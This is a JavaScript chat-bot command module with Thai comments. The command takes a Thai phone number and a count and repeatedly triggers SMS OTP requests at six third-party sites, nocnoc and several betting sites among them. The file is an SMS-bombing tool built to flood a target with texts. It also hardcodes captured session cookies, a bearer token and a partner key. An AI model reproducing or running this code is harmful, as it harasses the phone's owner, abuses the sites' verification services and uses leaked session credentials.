const axios = require('axios');
const chalk = require('chalk');

module.exports = {
    config: {
        name: "ยิงเบอร์",
        description: "ส่ง SMS ไปยังเบอร์โทรศัพท์ที่ระบุ จำนวนครั้งสูงสุดที่ 30",
        usage: "/ยิงเบอร์ <phone_number> <amount>",
        permissions: "admin", // กำหนดสิทธิ์การใช้งาน (ถ้ามี)
    },
    run: async ({ api, event, args }) => {
        // ตรวจสอบว่ามีอาร์กิวเมนต์เพียงพอ
        if (args.length < 2) {
            return api.sendMessage("❗ กรุณาระบุหมายเลขโทรศัพท์และจำนวนครั้งที่ต้องการส่ง SMS\nตัวอย่างการใช้งาน: !sendSMS 0922868441 5", event.threadID, event.messageID);
        }

        let phone = args[0];
        let amount = parseInt(args[1]);

        // ตรวจสอบรูปแบบหมายเลขโทรศัพท์
        const phoneRegex = /^0\d{9}$/;
        if (!phoneRegex.test(phone)) {
            return api.sendMessage("❗ หมายเลขโทรศัพท์ไม่ถูกต้อง กรุณาตรวจสอบใหม่อีกครั้ง", event.threadID, event.messageID);
        }

        // ตรวจสอบจำนวนครั้งที่ส่ง
        if (isNaN(amount) || amount < 1 || amount > 30) {
            return api.sendMessage("❗ จำนวนครั้งที่ส่ง SMS ต้องเป็นตัวเลขระหว่าง 1 ถึง 30", event.threadID, event.messageID);
        }

        // ฟังก์ชันสำหรับแต่ละ API
        const Api1 = async (phone) => {
            let headers = {
                'Accept': '*/*',
                'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..17joxolOgRBsdEwJFzsBoQ.EwELL271QWNPrP4PwReb-uGw4_7jJDHosBVy1aGC0EvH3bsk2ZgsgeYLPAKazE42ER55WP36WxN29tfdnxIZRrqID902AKTJGHbq3Nx3Q7t01CdcX__c5ZRFXD-mEEQo195-6x8ZXBkS9s1WNlqvUg.2VdXxY2lbWv-ai8ulpVOzg',
                'Content-Type': 'application/json; charset=utf-8',
                'Cookie': '_vwo_uuid_v2=D248F84DF4F833594D8CCB644862239FB|705043cfa8cf3a32c09bd8e38bd2cb87; _vwo_uuid=D248F84DF4F833594D8CCB644862239FB; _vwo_ds=3%241724239331%3A23.77925179%3A%3A; _gcl_au=1.1.1855608285.1724239339; __lt__cid=f05bcf8e-f914-4e8e-8b14-9427fb8858c0; _fbp=fb.1.1724239352549.162294572803650813; _tt_enable_cookie=1; ajs_anonymous_id=00a3c4f6-da32-437c-939a-0089cba022e7; _hjSessionUser_1027858=eyJpZCI6ImZmODcxOWNlLTFlZDgtNWRjMC1hOTVmLWI2MTA4NjViMzZlNCIsImNyZWF0ZWQiOjE3MjQyMzkzNTI4MzksImV4aXN0aW5nIjp0cnVlfQ==; __cf_bm=smCw9OCUhHbyskZjhavtlc96xigkwxneKb2H.jCTT1w-1731679076-1.0.1.1-9bOCEqrrb8vTwNREUGQLRWRILkFb5av8rfJdbR3z_iOYpv_vYhHpPbNDaMrsT8O8uaUG504RDcseTTTLkmRD.w; _cfuvid=mBgBbwPvVewaVj5FKWmMRjqSHX_kTwQygrd7Qp1vRes-1731679076936-0.0.1.1-604800000; _vis_opt_s=5%7C; _vis_opt_test_cookie=1; cf_clearance=_aeT3UlGSKxAdrOwNguvC9NfzFxRT5gq_wuwn0OVs2Y-1731679080-1.2.1.1-JlDA_PSnWqjrOI7mWDt0m2TLTxiPS_7mWuuTpRjIAiogeZHWNbr_ZBGLqv1DB2wZkjZzyMc1s.1mOGHVK4DlyL05Cw7GqC8UWou_xGCWrWht5G4g2Yo3RbYMaOhApYctioeWrJgCT7LYPEmoyfROPjvRV3RiwcFwfAeun7UZHd6U_M2VeeaSAinew7_p4CIduRm7i1C7htencXdjMvH7nhHUXyHb4d1Jqn8jdxSXinn3IW3YyJSevTJNKdx03Kgrm3YZhQaVJOgtKToC0PQuqf6Rnw9BZ1Y5mNg.vMXfrQZA_VZC8hy6Z3GYdq_cXLGqDOo4V2bVjvrNC2h74jwN0xL8V1PRGsl5auAifOGF6TdQ4JJMdLwAipm9C_CKEC.9; _vwo_sn=7439746%3A1; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22v35TWsJirM6Dnghdj8y1%22%2C%22expiryDate%22%3A%222025-11-15T13%3A58%3A06.452Z%22%7D; _gid=GA1.2.1310015673.1731679087; _gat_UA-12345-6=1; __lt__sid=7a68faa7-79a596dd; _ga=GA1.2.238083749.1724239342; _ga_QEVF0JHYKM=GS1.1.1731679088.4.1.1731679089.59.0.0; _hjSession_1027858=eyJpZCI6Ijc0NGJmYzk4LTRiOTMtNDk4Ni1iNGQ1LWI2YWFiZDAwMTljZSIsImMiOjE3MzE2NzkwOTIyMjMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _ttp=GmPKohW_YUIxzKOha5QWpPHsuqy.tt.1; _pin_unauth=dWlkPU1tTTNNVFV3WWpFdFlqSm1PQzAwWXpRMUxUazVOREV0TldReE4yUmtPR0l3TVRWaA; cto_bundle=ofyK1l9yWDJNN3FDR1l0VXJvSEgzdDYyT0diVHU0aVElMkJSbDhLM1NEVSUyRnRRVXhiWSUyRmhQYjEwOWtJY2pPY1B3dU5oJTJGc2tYTXA3ZUdrQnhxdXVCZ2ZqeGlmJTJGNHBPQmJ2aTFZVEJ1WXpUZTlaQ1ZZT2VyQTMlMkY2a2dVTCUyQlgzR3lBRzVFRkpFYW1ZQVpOOUtJRkx5ZWFEc2JOeUlVUSUzRCUzRA; __cfwaitingroom_nn_waiting_room=ChgyenpIZ29TTDFsNzdjMlRhT213WjB3PT0SlAJSOHZ1Vmh1UlBVaStPN2xXU3dzTDh6aGJOQUVjODdkZm5NY3RNSzVrMHpvOUVuOWRkVHU4ZWYwakhVOHpsQjh1NC9vS3M3VjVHc0U0YnJRSy9Sa0Q2Zm9VRE0rWmlubmdGUWttN0tRcXJNRDRuOW9wT0U1dnBBbFFub3paSERuZEdyQlRWS2RuM1EwcUkrOS9MNkphaHRONWVzdUJQNFFIalRiblZtcWZMS2xDcFZ2T0dqa2k2RzNGNVozZTd0RWVtMGdVcVJoaEJtRWdqU3ZkdDVuY2pOWWNZRGgvTEtqU0pCUkVqN2ZQSk1heE9MbTdLWi8yN0Z4M2ZrQTQ5UGlKY056NnRsakd5T3VEeXRMM2Z3Yz0%3D',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'Referer': 'https://nocnoc.com/'
            };
            let url = `https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66${phone.slice(1)}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66${phone.slice(1)}&phoneCountryCode=%2B66&b-uid=1.0.1`;
            
            try {
                const response = await axios.get(url, { headers });
                console.log(chalk.green(`✔️ nocnoc status code : ${response.status}`));
            } catch (error) {
                if (error.response) {
                    console.log(chalk.red(`❌ nocnoc status code : ${error.response.status}`));
                } else {
                    console.error(chalk.red(`❌ Error nocnoc : ${error.message}`));
                }
            }
        };

        const Api2 = async (phone) => {
            let headers = {
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'Cookie': '_gcl_au=1.1.1633389887.1731843365; skcm--ga-universal=true; skcm--ga-4=true; _ga=GA1.2.387541208.1731843369; _gid=GA1.2.63028240.1731843369',
                'Origin': 'https://me-sms.com',
                'Referer': 'https://me-sms.com/register',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
            };
            let data = {
                'phone': `${phone}`
            };
            let url = 'https://me-sms.com/api/otp';
            
            try {
                const response = await axios.post(url, data, { headers });
                console.log(chalk.green(`✔️ me otp status code : ${response.status}`));
            } catch (error) {
                if (error.response) {
                    console.log(chalk.red(`❌ me otp status code : ${error.response.status}`));
                } else {
                    console.error(chalk.red(`❌ Error me otp : ${error.message}`));
                }
            }
        };

        const Api3 = async (phone) => {
            let headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Cookie': 'auth.strategy=local',
                'Origin': 'https://m.gb69.win',
                'Referer': 'https://m.gb69.win/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
            };
            let data = {
                'registrera_typ': '',
                'telefon_number': `${phone}`
            };
            let url = 'https://m.gb69.win/api/otp';
            
            try {
                const response = await axios.post(url, data, { headers });
                console.log(chalk.green(`✔️ gb69 status code : ${response.status}`));
            } catch (error) {
                if (error.response) {
                    console.log(chalk.red(`❌ gb69 status code : ${error.response.status}`));
                } else {
                    console.error(chalk.red(`❌ Error gb69 : ${error.message}`));
                }
            }
        };

        const Api4 = async (phone) => {
            let headers = {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Cookie': `i18n_redirected=th;__cf_bm=FumcBlo.AEvpRk6Wy72HC2Wk3pxiuuqKUsHOAw.WAFc-1731938192-1.0.1.1-E1tG2Kal4GEN7MWZXDMPiC_yD8O8o_AxVrLjOIMBDwKGPYbXUjDqgGqjHgtcxUDd0tqFZsXjk5k66celuSIAsA; _cfuvid=pn44VIRXrxW2OQgtyCe5mA3RXkOGYeQfnCgHx8VnshQ-1731938215253-0.0.1.1-604800000`,
                'My-Domain': 'ask4win.co',
                'My-Ip': '125.27.208.26, 172.71.81.77',
                'Origin': 'https://ask4win.co',
                'Referer': 'https://ask4win.co/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
            };
            let data = {
                'phone': `${phone}`
            };
            let url = 'https://ask4win.co/api/tiamut/otp';
            
            try {
                const response = await axios.post(url, data, { headers });
                console.log(chalk.green(`✔️ ask4 status code : ${response.status}`));
            } catch (error) {
                if (error.response) {
                    console.log(chalk.red(`❌ ask4 status code : ${error.response.status}`));
                } else {
                    console.error(chalk.red(`❌ Error ask4 : ${error.message}`));
                }
            }
        };

        const Api5 = async (phone) => {
            let headers = {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Origin': 'https://m.7789betpro.com',
                'Referer': 'https://m.7789betpro.com/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
            };
            let data = {
                'mobileNumber': `${phone}`,
                'partnerKey': 'XPBBKKSBP7BP'
            };
            let url = 'https://api-member.oneplaybet.com/user/register/otp';
            
            try {
                const response = await axios.post(url, data, { headers });
                console.log(chalk.green(`✔️ 7789BP status code : ${response.status}`));
            } catch (error) {
                if (error.response) {
                    console.log(chalk.red(`❌ 7789BP status code : ${error.response.status}`));
                } else {
                    console.error(chalk.red(`❌ Error 7789BP : ${error.message}`));
                }
            }
        };

        const Api6 = async (phone) => {
            let headers = {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Cookie': 'i18n_redirected=th; __cf_bm=ehQ0lHqTTlETJljj41UHTuw85G6RMs4CEjOjOzySI2s-1732021818-1.0.1.1-bBJ_Ro6dLIElOXDZf487Iq_SnfPFXxzxQd80wGFNO38vzUiZ_gwSEyIyKNqZ8aw9G31GFUltWhd1UW_Dopbb2g; _cfuvid=a.ROe8ABFUZG7rEgUQBGPclmz0wz1BdUWGEiYINQkKo-1732021828613-0.0.1.1-604800000',
                'My-Domain': 'fine36.com',
                'My-Ip': '125.27.166.114, 172.68.104.157',
                'Origin': 'https://fine36.com',
                'Referer': 'https://fine36.com/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
            };
            let data = {
                'phone': `${phone}`
            };
            let url = 'https://fine36.com/api/tiamut/otp';
            
            try {
                const response = await axios.post(url, data, { headers });
                console.log(chalk.green(`✔️ fine36 status code : ${response.status}`));
            } catch (error) {
                if (error.response) {
                    console.log(chalk.red(`❌ fine36 status code : ${error.response.status}`));
                } else {
                    console.error(chalk.red(`❌ Error fine36 : ${error.message}`));
                }
            }
        };

        // Array ของฟังก์ชัน API
        const apiFunctions = [Api1, Api2, Api3, Api4, Api5, Api6];

        // ฟังก์ชันสำหรับการส่ง SMS
        const sendSMS = async (phone, amount) => {
            let sent = 0;
            let errors = 0;

            for (let i = 0; i < amount; i++) {
                for (let apiFunc of apiFunctions) {
                    try {
                        await apiFunc(phone);
                        sent++;
                        // ระหว่างการส่ง สามารถเพิ่ม delay ได้หากจำเป็น
                        // await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (error) {
                        errors++;
                        // สามารถจัดการข้อผิดพลาดเพิ่มเติมได้ที่นี่
                    }
                }
            }

            return { sent, errors };
        };

        // เรียกใช้ฟังก์ชันส่ง SMS
        const result = await sendSMS(phone, amount);

        // ส่งข้อความกลับไปยังผู้ใช้
        return api.sendMessage(`📱 ส่ง SMS ไปยังเบอร์ ${phone} จำนวน ${result.sent} ครั้ง\n❌ เกิดข้อผิดพลาดในการส่ง ${result.errors} ครั้ง`, event.threadID, event.messageID);
    }
};
